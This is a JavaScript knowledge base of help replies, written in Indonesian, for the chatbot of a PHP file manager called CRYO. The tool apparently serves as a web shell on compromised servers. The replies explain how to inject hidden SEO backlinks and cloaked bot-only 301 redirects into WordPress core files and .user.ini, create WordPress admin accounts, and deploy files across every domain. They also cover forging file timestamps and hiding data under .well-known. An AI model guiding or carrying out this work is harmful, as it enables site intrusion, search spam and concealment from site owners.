const KB = [
          {
              keys: ['halo','hai','hello','hi','hey','help','bantuan','bantu'],
              reply: function() {
                  return 'Halo! Saya <strong>CRYO Assistant</strong>. Saya bisa membantu kamu tentang file manager ini.<div class="cryo-quick"><button onclick="sendQ(&#39;server info&#39;)">Server Info</button><button onclick="sendQ(&#39;cara upload&#39;)">Cara Upload</button><button onclick="sendQ(&#39;cara terminal&#39;)">Terminal</button><button onclick="sendQ(&#39;folder ini&#39;)">Folder Ini</button><button onclick="sendQ(&#39;fitur&#39;)">Daftar Fitur</button></div>';
              }
          },
          {
              keys: ['server info','info server','server','spesifikasi','spec','spek'],
              reply: function() {
                  return '<strong>Server Information:</strong><br>' +
                      '" Server: <code>' + CTX.serverSw + '</code><br>' +
                      '" Domain: <code>' + CTX.serverName + '</code><br>' +
                      '" IP: <code>' + CTX.serverIp + '</code><br>' +
                      '" PHP: <code>' + CTX.phpVer + '</code><br>' +
                      '" OS: <code>' + CTX.os + '</code><br>' +
                      '" Disk: <code>' + CTX.diskFree + '</code> free / <code>' + CTX.diskTotal + '</code> total<br>' +
                      '" Max Upload: <code>' + CTX.maxUpload + '</code><br>' +
                      '" Post Max: <code>' + CTX.postMax + '</code><br>' +
                      '" Memory Limit: <code>' + CTX.memLimit + '</code>';
              }
          },
          {
              keys: ['folder ini','folder sekarang','current','dimana','direktori','isi folder','list file','daftar file'],
              reply: function() {
                  let r = '<strong>Folder saat ini:</strong><br><code>' + CTX.folder + '</code><br>Berisi <strong>' + CTX.fileCount + '</strong> item.';
                  if (CTX.items.length > 0) {
                      r += '<br><br><strong>Isi:</strong><br>';
                      CTX.items.slice(0, 15).forEach(function(f) { r += '" <code>' + f + '</code><br>'; });
                      if (CTX.fileCount > 15) r += '" ... dan ' + (CTX.fileCount - 15) + ' item lainnya';
                  }
                  return r;
              }
          },
          {
              keys: ['upload','unggah','cara upload'],
              reply: function() {
                  return '<strong>Cara Upload File:</strong><br><br>' +
                      '<strong>1. Upload File Biasa:</strong><br>" Klik tombol <code>Choose File</code> di sidebar kiri<br>" Pilih file dari komputer<br>" Klik <code>Upload</code><br>" Max size: <code>' + CTX.maxUpload + '</code><br><br>' +
                      '<strong>2. Upload via URL:</strong><br>" Di sidebar, cari card <code>Download from URL</code><br>" Masukkan URL lengkap file (contoh: <code>https://example.com/file.zip</code>)<br>" Klik <code>Download</code><br>" File akan didownload ke folder yang sedang dibuka<br><br>' +
                      '<strong>Tips:</strong> Untuk file besar, gunakan Upload via URL karena tidak dibatasi oleh <code>upload_max_filesize</code>.';
              }
          },
          {
              keys: ['terminal','cmd','command','perintah','cara terminal','shell'],
              reply: function() {
                  return '<strong>Cara Menggunakan Terminal:</strong><br><br>' +
                      '" Klik tombol <code>Open Terminal</code> di sidebar<br>" Ketik perintah lalu tekan <code>Enter</code><br><br>' +
                      '<strong>Command yang sering dipakai:</strong><br>' +
                      '" <code>ls -la</code>  lihat isi folder detail<br>' +
                      '" <code>pwd</code>  lihat posisi folder<br>' +
                      '" <code>cd namaFolder</code>  masuk ke folder<br>' +
                      '" <code>cd ..</code>  mundur 1 folder<br>' +
                      '" <code>mkdir namaFolder</code>  buat folder baru<br>' +
                      '" <code>rm namaFile</code>  hapus file<br>' +
                      '" <code>rm -rf namaFolder</code>  hapus folder + isinya<br>' +
                      '" <code>cp file1 file2</code>  copy file<br>' +
                      '" <code>mv file1 file2</code>  pindahkan/rename<br>' +
                      '" <code>cat namaFile</code>  lihat isi file<br>' +
                      '" <code>wget URL</code>  download file dari URL<br>' +
                      '" <code>zip -r arsip.zip folder/</code>  zip folder<br>' +
                      '" <code>unzip arsip.zip</code>  extract zip<br>' +
                      '" <code>du -sh *</code>  lihat ukuran file/folder<br>' +
                      '" <code>df -h</code>  lihat kapasitas disk<br>' +
                      '" <code>find . -name "*.php"</code>  cari file PHP';
              }
          },
          {
              keys: ['trash','recycle','sampah','hapus','delete','cara hapus','restore'],
              reply: function() {
                  return '<strong><i class="fas fa-trash-can" style="color:#ef4444"></i> Trash / Recycle Bin:</strong><br><br>' +
                      '&bull; File yang dihapus tidak langsung hilang - pindah ke <strong>Trash</strong> dulu<br>' +
                      '&bull; Buka via tombol <code>Open Trash</code> di sidebar (atau URL <code>?view_trash=1</code>)<br>' +
                      '&bull; Lokasi: <code>DOCUMENT_ROOT/.well-known/acme-challenge/.cache/.trash</code> (auto-protected via .htaccess)<br><br>' +
                      '<strong>Restore:</strong> klik tombol <i class="fas fa-rotate-left" style="color:#86efac"></i> hijau di samping file - file kembali ke lokasi asal (jika nama bentrok diberi sufiks <code>_restored_N</code>).<br><br>' +
                      '<strong>Hapus Permanen:</strong> tombol <i class="fas fa-xmark" style="color:#ef4444"></i> merah, atau <code>Empty Trash</code> untuk kosongkan semua.<br><br>' +
                      '<strong>Auto-clean:</strong> file di Trash otomatis dihapus setelah <code>7 hari</code>.<br>' +
                      '<strong>Metadata:</strong> path asli &amp; tanggal hapus disimpan di file <code>.meta</code> per item.';
              }
          },
          {
              keys: ['permission','chmod','izin','hak akses','755','644','777'],
              reply: function() {
                  return '<strong>Tentang Permission / Chmod:</strong><br><br>' +
                      '<strong>Format:</strong> 3 digit angka (pemilik-grup-publik)<br>' +
                      '" <code>7</code> = baca + tulis + eksekusi<br>' +
                      '" <code>6</code> = baca + tulis<br>' +
                      '" <code>5</code> = baca + eksekusi<br>' +
                      '" <code>4</code> = baca saja<br><br>' +
                      '<strong>Yang umum dipakai:</strong><br>' +
                      '" <code>755</code>  folder (standar)<br>' +
                      '" <code>644</code>  file biasa (standar)<br>' +
                      '" <code>600</code>  file sensitif (.env, config)<br>' +
                      '" <code>444</code>  read-only<br><br>' +
                      '<strong>Cara:</strong> Ketik angka di kolom chmod di samping file, lalu klik tombol kunci =';
              }
          },
          {
              keys: ['zip','extract','arsip','archive','tar','compress','kompres'],
              reply: function() {
                  return '<strong>ZIP & Extract:</strong><br><br>' +
                      '<strong>Membuat ZIP:</strong><br>' +
                      '" Pilih file/folder dengan checkbox<br>" Pilih format (zip/tar/tar.gz/tar.bz2)<br>" Klik <code>ZIP Selected</code><br>" Atau klik icon =� di samping file individual<br><br>' +
                      '<strong>Extract:</strong><br>' +
                      '" Klik icon extract (=�) di samping file arsip<br>" Pilih tujuan extract<br>" File akan diekstrak ke folder yang dipilih<br><br>' +
                      '<strong>Via Terminal:</strong><br>' +
                      '" <code>zip -r output.zip folder/</code><br>' +
                      '" <code>unzip file.zip</code><br>' +
                      '" <code>tar -czf output.tar.gz folder/</code><br>' +
                      '" <code>tar -xzf file.tar.gz</code>';
              }
          },
          {
              keys: ['edit','editor','cara edit','code editor','edit file'],
              reply: function() {
                  return '<strong>Cara Edit File:</strong><br><br>' +
                      '" Klik <strong>nama file</strong> di daftar file<br>' +
                      '" Editor akan terbuka dengan syntax highlighting<br>' +
                      '" Edit isinya sesuai kebutuhan<br>' +
                      '" Klik tombol <code>Save</code> untuk menyimpan<br><br>' +
                      '<strong>Tips:</strong><br>' +
                      '" Editor mendukung banyak bahasa (PHP, JS, HTML, CSS, dll)<br>' +
                      '" Hati-hati saat mengedit <code>.htaccess</code>  kesalahan bisa bikin website error 500';
              }
          },
          {
              keys: ['deploy','copy domain','salin ke domain','deploy file'],
              reply: function() {
                  return '<strong>Deploy File:</strong><br><br>' +
                      '" Klik <code>Deploy to Domains</code> di sidebar (Admin only)<br>' +
                      '" Pilih file yang ingin di-deploy<br>' +
                      '" File akan disalin ke semua domain/subdomain di server<br><br>' +
                      '<strong>Kegunaan:</strong> Menyebarkan file (misal: script, config) ke banyak domain sekaligus tanpa copy satu per satu.';
              }
          },
          {
              keys: ['redirect','301','redirect 301','cara redirect'],
              reply: function() {
                  return '<strong>Redirect 301:</strong><br><br>' +
                      '" Klik <code>Create Redirect</code> di sidebar (Admin only)<br>' +
                      '" Buat aturan redirect dari URL lama ke URL baru<br>' +
                      '" Redirect akan ditambahkan ke <code>.htaccess</code><br><br>' +
                      '<strong>Contoh:</strong><br>' +
                      '" <code>/halaman-lama</code> � <code>https://domain.com/halaman-baru</code>';
              }
          },
          {
              keys: ['timestamp','sync','waktu','ubah tanggal','modify time','touch'],
              reply: function() {
                  return '<strong>Sync Timestamp:</strong><br><br>' +
                      '" Mengubah tanggal modifikasi file/folder<br>' +
                      '" Masukkan path target, tanggal, dan waktu<br>' +
                      '" Centang <code>Recursive</code> untuk ubah semua isinya juga<br><br>' +
                      '<strong>Via Terminal:</strong><br>' +
                      '" <code>touch -t YYYYMMDDhhmm namaFile</code>';
              }
          },
          {
              keys: ['rename','ubah nama','ganti nama','cara rename'],
              reply: function() {
                  return '<strong>Cara Rename File/Folder:</strong><br><br>' +
                      '" Klik icon <code>pensil</code> () di samping nama file<br>' +
                      '" Masukkan nama baru<br>' +
                      '" Klik OK / Enter<br><br>' +
                      '<strong>Via Terminal:</strong><br>' +
                      '" <code>mv namaLama namaBaru</code>';
              }
          },
          {
              keys: ['buat file','create file','new file','file baru','buat folder','create folder','new folder','folder baru','mkdir'],
              reply: function() {
                  return '<strong>Buat File / Folder Baru:</strong><br><br>' +
                      '<strong>Buat File:</strong><br>' +
                      '" Di sidebar, isi nama file di kolom <code>Create New File</code><br>' +
                      '" Klik <code>Create</code><br><br>' +
                      '<strong>Buat Folder:</strong><br>' +
                      '" Di sidebar, isi nama folder di kolom <code>Create Folder</code><br>' +
                      '" Klik <code>Create</code><br><br>' +
                      'File/folder akan dibuat di folder yang sedang dibuka: <code>' + CTX.folder + '</code>';
              }
          },
          {
              keys: ['wordpress','wp-admin','wp admin','cara wp'],
              reply: function() {
                  return '<strong>WordPress Admin Tools:</strong><br><br>' +
                      '" Klik <code>Admin Tools</code> di sidebar (Admin only)<br>' +
                      '" Fitur yang tersedia:<br>' +
                      '  - Buat user admin WP baru<br>' +
                      '  - Reset password admin WP<br><br>' +
                      '<strong>Tips:</strong> Pastikan folder yang dibuka adalah root WordPress (ada <code>wp-config.php</code>).';
              }
          },
          {
              keys: ['php','phpinfo','php version','versi php'],
              reply: function() {
                  return '<strong>PHP Information:</strong><br>' +
                      '" Versi: <code>' + CTX.phpVer + '</code><br>' +
                      '" Max Upload: <code>' + CTX.maxUpload + '</code><br>' +
                      '" Post Max Size: <code>' + CTX.postMax + '</code><br>' +
                      '" Memory Limit: <code>' + CTX.memLimit + '</code><br><br>' +
                      '<strong>Cek detail via Terminal:</strong><br>' +
                      '" <code>php -v</code>  versi PHP CLI<br>' +
                      '" <code>php -m</code>  modul terinstall<br>' +
                      '" <code>php -i | grep extension</code>  cari extension';
              }
          },
          {
              keys: ['disk','space','ruang','kapasitas','storage','penyimpanan'],
              reply: function() {
                  return '<strong>Disk Space:</strong><br>' +
                      '" Free: <code>' + CTX.diskFree + '</code><br>' +
                      '" Total: <code>' + CTX.diskTotal + '</code><br><br>' +
                      '<strong>Cek via Terminal:</strong><br>' +
                      '" <code>df -h</code>  ringkasan disk<br>' +
                      '" <code>du -sh *</code>  ukuran per folder<br>' +
                      '" <code>du -sh .</code>  ukuran folder ini<br>' +
                      '" <code>du -h --max-depth=1 | sort -rh</code>  folder terbesar';
              }
          },
          {
              keys: ['htaccess','ht access','cara htaccess','error 500','500','403','404'],
              reply: function() {
                  return '<strong>.htaccess & HTTP Errors:</strong><br><br>' +
                      '<strong>Error 500:</strong> Cek <code>.htaccess</code>  mungkin ada syntax error. Coba rename jadi <code>.htaccess.bak</code> lalu test.<br><br>' +
                      '<strong>Error 403:</strong> Permission salah. Folder harus <code>755</code>, file harus <code>644</code>.<br><br>' +
                      '<strong>Error 404:</strong> File tidak ditemukan. Cek apakah path di <code>.htaccess</code> rewrite benar.<br><br>' +
                      '<strong>Tips:</strong><br>' +
                      '" Jangan ubah permission ke <code>777</code>  rawan dan bisa di-flag WAF<br>' +
                      '" Backup <code>.htaccess</code> sebelum edit';
              }
          },
          {
                keys: ['htaccess','redirect','hardening','rewrite','wp-includes','wp-content','crawl bot','google console','301'],
                reply: function() {
                    return '<strong>Htaccess & Redirect (Admin only):</strong><br><br>' +
                        'Buka panel kanan � klik <code>Htaccess & Redirect</code>. Pilih kategori:<br><br>' +
                        '<strong>=� Kategori .htaccess Rules:</strong><br>' +
                        '" <code>wp-includes</code>  block PHP execution di wp-includes<br>' +
                        '" <code>wp-content</code>  allow only file statis<br>' +
                        '" <code>Custom Allow</code>  buka semua akses<br>' +
                        '" <code>Custom Deny</code>  block eksekusi PHP umum<br>' +
                        '" <code>Folder Safe</code>  fallback WordPress aman<br>' +
                        '" <code>Tolak Google Console</code>  block file verifikasi google<br>' +
                        '" <code>Tolak Crawl Bot</code>  block bot Google/Bing/Baidu<br><br>' +
                        '<strong>� Kategori Redirect:</strong><br>' +
                        '" <code>Redirect All</code>  redirect semua URL ke target<br>' +
                        '" <code>Redirect Pengecualian</code>  redirect kecuali folder/query tertentu<br>' +
                        '" <code>Redirect per Brand</code>  redirect per folder ke subpath target<br>' +
                        '" <code>Redirect di Theme</code>  inject ke <code>functions.php</code><br><br>' +
                        '<strong>Cara kerja:</strong><br>' +
                        '" Snippet dibungkus marker <code>BEGIN/END CRYO_TPL</code><br>' +
                        '" Jika .htaccess sudah ada � ditambahkan di bawahnya (TIDAK timpa)<br>' +
                        '" Jika belum ada � dibuat baru<br>' +
                        '" Pilih <code>Aktifkan (ON)</code> untuk pasang, <code>Nonaktifkan (OFF)</code> untuk lepas';
                }
            },
            {
              keys: ['fitur','feature','menu','apa saja','kemampuan','bisa apa'],
              reply: function() {
                  return '<strong>Fitur CRYO v2.0:</strong><br><br>' +
                      '<i class="fas fa-folder-tree" style="color:#60a5fa"></i> <strong>File Management:</strong> Browse, upload, download, rename, edit, delete, create file/folder<br>' +
                      '<i class="fas fa-file-zipper" style="color:#fbbf24"></i> <strong>Archive:</strong> ZIP, TAR, TAR.GZ, TAR.BZ2 - create &amp; extract<br>' +
                      '<i class="fas fa-trash-can" style="color:#ef4444"></i> <strong>Trash:</strong> Soft-delete dengan restore (auto-clean 7 hari)<br>' +
                      '<i class="fas fa-key" style="color:#fbbf24"></i> <strong>Permission:</strong> Chmod file/folder<br>' +
                      '<i class="fas fa-code" style="color:#a78bfa"></i> <strong>Code Editor:</strong> Edit file dengan syntax highlighting<br>' +
                      '<i class="fas fa-magnifying-glass" style="color:#22c55e"></i> <strong>Code Explorer:</strong> Cari kata / nama file rekursif (Search Files &amp; Code di sidebar)<br>' +
                      '<i class="fas fa-link" style="color:#22d3ee"></i> <strong>Sisip Link:</strong> Inject link SEO multi-framework (WordPress, Laravel, CodeIgniter, Yii, Slim, atau PHP biasa) - admin<br>' +
                      '<i class="fas fa-terminal" style="color:#34d399"></i> <strong>Terminal:</strong> Command prompt langsung di browser<br>' +
                      '<i class="fas fa-cloud-arrow-down" style="color:#60a5fa"></i> <strong>Download URL:</strong> Download file dari URL ke server<br>' +
                      '<i class="fas fa-shield-halved" style="color:#f472b6"></i> <strong>Htaccess &amp; Redirect:</strong> Template .htaccess hardening + redirect (admin)<br>' +
                      '<i class="fab fa-wordpress" style="color:#21759b"></i> <strong>Redirect via Wp-includes:</strong> Bot UA cloaking 301 ke domain lain via wp-includes/load.php (admin) - <em>baru</em><br>' +
                      '<i class="fas fa-rocket" style="color:#fb923c"></i> <strong>Deploy:</strong> Copy file ke semua domain<br>' +
                      '<i class="fas fa-clock" style="color:#94a3b8"></i> <strong>Timestamp:</strong> Ubah tanggal modifikasi file<br>' +
                      '<i class="fab fa-wordpress" style="color:#21759b"></i> <strong>WordPress:</strong> Admin tools (create/reset user)<br>' +
                      '<i class="fas fa-robot" style="color:#a5b4fc"></i> <strong>CRYO Assistant:</strong> Bantuan penggunaan (ini!)';
              }
          },
          {
              keys: ['cari','search','pencarian','code explorer','explorer','grep','find','temukan'],
              reply: function() {
                  return '<strong><i class="fas fa-magnifying-glass" style="color:#22c55e"></i> Code Explorer  Cara Pakai:</strong><br><br>' +
                      '1 Klik tombol <strong>Search Files & Code</strong> di sidebar (bagian CODE EXPLORER).<br>' +
                      '2 Isi <strong>Query</strong>: kata / nama variabel / regex yang dicari.<br>' +
                      '3 <strong>Scope Path</strong>: folder awal pencarian (absolut). Tombol cepat: <em>Folder ini</em>, <em>Document Root</em>, <em>.. (Parent)</em>.<br>' +
                      '4 <strong>Mode</strong>: Isi File / Nama File / Keduanya.<br>' +
                      '5 <strong>Filter Nama File (glob)</strong>: contoh <code>*.php</code>, <code>*.html,*.js</code>. Boleh juga ketik <code>php</code> saja  otomatis jadi <code>*.php</code>.<br>' +
                      '6 Centang <strong>Case-sensitive</strong> / <strong>Regex</strong> bila perlu.<br>' +
                      '7 Klik <strong>Cari</strong> atau tekan Enter.<br><br>' +
                      '<strong>Limit aman:</strong> 5 MB/file " 20.000 file " 50 detik " 500 hasil.<br>' +
                      '<strong>Tip:</strong> Klik <em>Buka folder</em> di hasil untuk navigasi langsung.';
              }
          },
          {
              keys: ['sisip','link','injector','sisip link','seo link','backlink','panel link'],
              reply: function() {
                  return '<strong><i class="fas fa-link" style="color:#22d3ee"></i> Sisip Link  Cara Pakai (Admin):</strong><br><br>' +
                      '1 Klik <strong>Kelola Sisip Link</strong> di sidebar.<br>' +
                      '2 Scope = folder aktif (otomatis).<br>' +
                      '3 Isi <strong>Link 1</strong> (wajib): URL + Anchor + rel + opsi Hidden.<br>' +
                      '4 Link 2 & 3 opsional, kosongkan untuk skip.<br>' +
                      '5 (Opsional) Pilih <strong>Framework target</strong>: <em>Auto-detect</em> (default), <em>WordPress</em>, <em>Laravel</em>, atau <em>Lainnya</em>.<br>' +
                      '6 Klik <strong>Aktifkan / Update</strong>.<br><br>' +
                      '<strong>Mekanisme per Framework:</strong><br>' +
                      '" <strong>Auto:</strong> deteksi <code>wp-load.php</code> -> WordPress; jika tidak ada -> .user.ini.<br>' +
                      '" <strong>WordPress:</strong> bikin <code>wp-content/mu-plugins/panel-links.php</code>.<br>' +
                      '" <strong>Laravel:</strong> tulis <code>.user.ini</code> + cache di folder <code>/public</code> (entry point).<br>' +
                      '" <strong>Lainnya:</strong> tulis <code>auto_prepend_file</code> ke <code>.user.ini</code> di scope.<br>' +
                      '" Selalu tulis <code>.site_links.json</code> + <code>.panel_render.php</code> di lokasi target.<br><br>' +
                      '<strong>.user.ini aman:</strong> hanya baris milik CRYO yang ditambah/dihapus  setting PHP existing tetap utuh.<br>' +
                      '<strong>Nonaktifkan:</strong> Klik <strong>Nonaktifkan & Bersihkan</strong>  semua file injector dihapus (root + /public), .user.ini & .htaccess dibersihkan dari baris CRYO.';
              }
          },
          {
              keys: ['wpinc','wp-includes','load.php','cloaking','bot redirect','redirect bot','wpinc_bot_redirect'],
              reply: function() {
                  return '<strong><i class="fab fa-wordpress" style="color:#21759b"></i> Redirect via Wp-includes - Cara Pakai (Admin):</strong><br><br>' +
                      '1. Buka <strong>Htaccess &amp; Redirect</strong> di sidebar.<br>' +
                      '2. Pilih <strong>Kategori</strong>: <em>Redirect via Wp-includes</em>.<br>' +
                      '3. <strong>Folder Tujuan</strong>: root WordPress (yang berisi <code>wp-includes/</code>) atau langsung folder <code>wp-includes/</code> - keduanya didukung auto-detect.<br>' +
                      '4. Isi <strong>Route 1</strong> (wajib): Path URL Sumber (mis. <code>/services/contoh</code>) + Target URL (URL tujuan saat bot mengakses).<br>' +
                      '5. Route 2-8 opsional, kosongkan jika tidak dipakai.<br>' +
                      '6. Klik <strong>Aktifkan (ON)</strong>.<br><br>' +
                      '<strong>Mekanisme:</strong> snippet PHP disisipkan ke <code>wp-includes/load.php</code> dengan marker <code>// BEGIN/END CRYO_TPL:wpinc_bot_redirect</code>. Hanya request yang User-Agent-nya match keyword bot (<code>googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot</code>) yang di-redirect 301 - user biasa tetap melihat halaman normal.<br><br>' +
                      '<strong>Nonaktifkan:</strong> di panel &quot;Snippet Aktif&quot;, klik tombol <code>OFF</code> di samping entry <code>wpinc_bot_redirect</code> - marker block dihapus, file load.php utuh.';
              }
          },
                    {
              keys: ['shortcut','keyboard','tombol','hotkey','pintas','pintasan'],
              reply: function() {
                  return '<strong><i class="fas fa-keyboard" style="color:#a5b4fc"></i> Keyboard Shortcuts:</strong><br><br>' +
                      '<code>Backspace</code>  Back ke parent folder<br>' +
                      '<code>Esc</code>  Tutup modal yang sedang terbuka (atau panel CRYO Assistant)<br><br>' +
                      '<em>Catatan:</em> Backspace tidak aktif saat kursor berada di kolom input/editor. Esc tetap aktif walau di dalam input agar mudah menutup modal.';
              }
          },
          {
              keys: ['role','akses','semar','edi','engkit','admin','hak'],
              reply: function() {
                  return '<strong>Role &amp; Akses:</strong><br><br>' +
                      'Role kamu saat ini: <code>' + CTX.role + '</code><br><br>' +
                      '<strong>Admin:</strong> Akses penuh - semua fitur tersedia<br>' +
                      '<strong>Semar / Edi / Engkit:</strong> Akses terbatas (non-admin) - tidak bisa edit <code>.htaccess</code>, tidak bisa akses Terminal, WordPress tools, Deploy, dan Redirect';
              }
          },
          {
              keys: ['download','unduh','cara download'],
              reply: function() {
                  return '<strong>Cara Download File:</strong><br><br>' +
                      '" Klik tombol <code>download</code> () di samping file<br>' +
                      '" File akan langsung terunduh ke komputer<br><br>' +
                      '<strong>Download Folder:</strong><br>' +
                      '" Pilih folder dengan checkbox<br>' +
                      '" Klik <code>ZIP Selected</code> untuk zip dulu<br>' +
                      '" Lalu download file ZIP-nya';
              }
          },
          {
              keys: ['copy','salin','duplicate','duplikat'],
              reply: function() {
                  return '<strong>Copy / Duplikat File:</strong><br><br>' +
                      'Saat ini fitur copy tersedia via <strong>Terminal</strong>:<br>' +
                      '" <code>cp file.txt file_copy.txt</code>  copy file<br>' +
                      '" <code>cp -r folder/ folder_copy/</code>  copy folder<br>' +
                      '" <code>cp file.txt /path/tujuan/</code>  copy ke folder lain';
              }
          },
          {
              keys: ['search','cari','find','cari file'],
              reply: function() {
                  return '<strong>Cari File:</strong><br><br>' +
                      'Gunakan <strong>Terminal</strong> untuk mencari file:<br>' +
                      '" <code>find . -name "*.php"</code>  cari file PHP<br>' +
                      '" <code>find . -name "config*"</code>  cari file awalan config<br>' +
                      '" <code>grep -r "kata" .</code>  cari isi file yang mengandung kata<br>' +
                      '" <code>find . -size +10M</code>  cari file > 10MB<br>' +
                      '" <code>find . -mtime -1</code>  file diubah 24 jam terakhir';
              }
          }
      ];